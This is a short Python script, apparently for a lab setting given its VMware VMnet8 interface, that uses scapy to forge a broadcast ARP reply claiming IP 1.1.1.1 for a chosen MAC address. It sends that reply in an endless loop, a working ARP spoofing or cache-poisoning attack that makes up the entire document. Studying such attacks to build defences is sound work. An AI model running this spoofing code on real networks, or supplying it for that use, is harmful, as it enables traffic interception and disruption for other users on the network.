from  scapy.all import *
ETH = Ether(dst='ff:ff:ff:ff:ff:ff', src='a8:6b:7c:87:34:bd', type=0x0806)
arp = ARP(hwsrc='a8:6b:7c:87:34:bd', psrc='1.1.1.1', hwdst='ff:ff:ff:ff:ff:ff', pdst='1.1.1.2', op=2)
packet = ETH/arp

sendp(packet, iface='VMware Network Adapter VMnet8', loop=1)